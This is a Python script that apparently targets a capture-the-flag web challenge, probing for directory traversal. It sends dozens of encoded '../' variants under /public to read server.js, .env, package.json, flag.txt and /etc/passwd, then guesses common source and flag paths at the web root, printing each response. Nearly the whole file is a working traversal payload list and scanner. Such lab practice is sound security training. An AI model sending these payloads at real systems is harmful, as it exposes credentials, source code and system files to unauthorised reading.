#!/usr/bin/env python3
import urllib.request, urllib.error, http.cookiejar, re
BASE = "https://d7eef812-5707-splice-c7f97.mystery-challenges.webverselabs-pro.com"
cj=http.cookiejar.CookieJar()
op=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders=[("User-Agent","Mozilla/5.0")]
def do(path):
    r=urllib.request.Request(BASE+path)
    try:
        resp=op.open(r,timeout=30); return resp.status, dict(resp.getheaders()), resp.read()
    except urllib.error.HTTPError as e: return e.code, dict(e.headers), e.read()
    except Exception as e: return -1,{},str(e).encode()

def t(path):
    st,h,b=do(path)
    body=b.decode('utf-8','replace')
    is404 = ("could not find that page" in body.lower()) or (st==404)
    tag = "404" if is404 else str(st)
    snip=re.sub(r"\s+"," ",body)[:160]
    print(f"  {path:48} -> {tag:>4} ct={h.get('Content-Type','')[:26]:26} len={len(b)} {snip if tag!='404' else ''}")
    return st,h,b

print("== baseline static ==")
t("/public/css/site.css")
print("\n== /public traversal attempts ==")
for p in ["/public/","/public","/public/..","/public/../","/public/../server.js","/public/..%2fserver.js",
 "/public/%2e%2e/server.js","/public/..%2f..%2fserver.js","/public/....//server.js",
 "/public/..%2f..%2f..%2fetc%2fpasswd","/public/..%5cserver.js","/public/%2e%2e%2fserver.js",
 "/public/..%252fserver.js","/public/.%2e/server.js","/public/css/../../server.js",
 "/public/css/..%2f..%2fserver.js","/public/css/%2e%2e/%2e%2e/flag.txt",
 "/public/../flag.txt","/public/../../flag.txt","/public/../app.js","/public/../index.js",
 "/public/../package.json","/public/../.env","/public/../render.js","/public/../lib/render.js",
 "/public/../src/server.js","/public/../routes/render.js"]:
    t(p)

print("\n== common source/flag at web root & /public ==")
for p in ["/server.js","/app.js","/index.js","/package.json","/.env","/flag.txt","/flag",
 "/public/flag.txt","/public/flag","/public/server.js","/public/app.js","/public/js/studio.js",
 "/public/render.js","/public/index.html","/features"]:
    t(p)
print("\nDONE")
